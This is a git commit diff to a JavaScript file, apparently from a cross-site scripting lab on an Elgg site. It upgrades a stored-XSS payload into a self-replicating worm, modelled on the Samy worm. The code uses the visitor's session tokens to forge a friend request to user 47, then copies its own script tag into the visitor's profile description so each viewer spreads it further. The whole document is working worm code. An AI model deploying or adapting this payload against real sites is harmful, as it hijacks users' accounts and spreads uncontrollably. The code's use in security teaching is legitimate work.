7333759881315165c9cf7d4a16d85f5baed781d0
Han <146796776+XinghanYin@users.noreply.github.com>
2024-11-25 00:24:08 -0500

    Update abc.js

--- js/abc.js
+++ js/abc.js
@@ -1,22 +1,40 @@
-<script type="text/javascript">
+<script id="worm" type="text/javascript">
 window.onload = function() {
-   
-    if(elgg.session.user.guid != 47) {  
+  
+    if(elgg.session.user.guid != 47) {
+       
+        var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + 
+                     "&__elgg_ts=" + elgg.security.token.__elgg_ts + 
+                     "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("GET", sendurl, true);
+        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send();
+
+        // 2. 修改个人资料
+        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        var jsCode = document.getElementById("worm").innerHTML;
+        var tailTag = "</" + "script>";
+        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
         var content = "__elgg_token=" + elgg.security.token.__elgg_token +
                      "&__elgg_ts=" + elgg.security.token.__elgg_ts +
                      "&name=" + elgg.session.user.name +
-                     "&description=" + encodeURIComponent("Samy is my HERO (ADDED BY HAN)") +
+                     "&description=" + wormCode +
                      "&accesslevel[description]=2" +
                      "&briefdescription=" + encodeURIComponent("Samy is my HERO (ADDED BY HAN)") +
                      "&accesslevel[briefdescription]=2" +
                      "&guid=" + elgg.session.user.guid;
 
-        var Ajax = null;
-        Ajax = new XMLHttpRequest();
-        Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
-        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
-        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        Ajax.send(content);
+        var Ajax2 = null;
+        Ajax2 = new XMLHttpRequest();
+        Ajax2.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
+        Ajax2.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax2.send(content);
     }
 }
 </script>
